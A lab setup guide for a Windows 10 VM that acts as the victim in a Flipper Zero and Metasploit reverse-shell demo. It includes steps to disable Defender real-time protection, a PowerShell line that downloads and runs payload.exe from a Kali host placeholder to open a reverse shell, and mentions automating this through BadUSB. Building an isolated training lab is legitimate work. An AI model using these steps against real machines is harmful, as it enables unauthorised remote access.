# Windows VM Setup Guide for Flipper Zero + Metasploit Demo

This guide provides step-by-step instructions for setting up the Windows virtual machine that serves as the **victim** in the Flipper Zero + Metasploit reverse shell demo. It assumes you are using a clean Windows 10 VM image.

---

## 1. System Requirements

* **OS:** Windows 10 (64-bit)
* **RAM:** 4 GB minimum
* **CPU:** 2 Cores minimum
* **Disk Space:** 40 GB minimum
* **Virtualization Tool:** VirtualBox or VMware
* **Network Mode:** Bridged Adapter (same as Kali)

---

## 2. Download Windows VM

You can use a free Windows 10 virtual machine image from Microsoft:

👉 [https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)

* Choose **VirtualBox** or **VMware** image.
* These VMs expire after 90 days. Make a snapshot after setup for reuse.

---

## 3. Import and Configure the VM

### For VirtualBox:

1. Open VirtualBox and click **File > Import Appliance**.
2. Select the downloaded `.ova` file.
3. Adjust the following settings before starting:

   * **System > Processor**: Set 2 cores.
   * **Network > Adapter 1**: Select **Bridged Adapter**.

### For VMware:

1. Open VMware Workstation or Player.
2. Click **Open a Virtual Machine**, and select the `.vmx` file.
3. Go to **VM > Settings > Network Adapter**, and set to **Bridged** mode.

---

## 4. Initial Windows Configuration

After launching the VM:

### Disable Windows Defender (for demonstration purposes):

**Note:** Only disable for safe, isolated test environments.

1. Open **Windows Security**.
2. Go to **Virus & threat protection > Manage settings**.
3. Turn off **Real-time protection**.

### Enable PowerShell:

Ensure PowerShell is accessible:

```powershell
powershell.exe
```

If disabled by policy, re-enable via Local Group Policy or Registry.

### Enable ICMP (Ping) Response (Optional):

To allow ping responses for network testing:

```powershell
netsh advfirewall firewall add rule name="ICMPv4-In" protocol=icmpv4:8,any dir=in action=allow
```

---

## 5. Host Network Configuration

Verify that the Windows VM is on the same subnet as the Kali VM.

```powershell
ipconfig
```

Example output:

```
IPv4 Address. . . . . . . . . . . : 192.168.178.36
```

You should be able to ping Kali VM's IP from here.

---

## 6. Download Payload from Kali

Assuming Kali is running a web server on port 8081:

```powershell
Invoke-WebRequest -Uri http://<kali_ip>:8081/payload.exe -OutFile payload.exe
```

Then run it:

```powershell
.\payload.exe
```

This should initiate the reverse shell back to Kali.

---

## 7. Notes

* Make sure your Windows VM **trusts** PowerShell execution (bypass policies if needed).
* You can use the Flipper Zero BadUSB script to execute this download+run command.
* Avoid using this setup on live or sensitive networks.

---

## ✅ Windows VM Setup Complete!

You can now test your payload manually or proceed to the Flipper Zero execution phase.
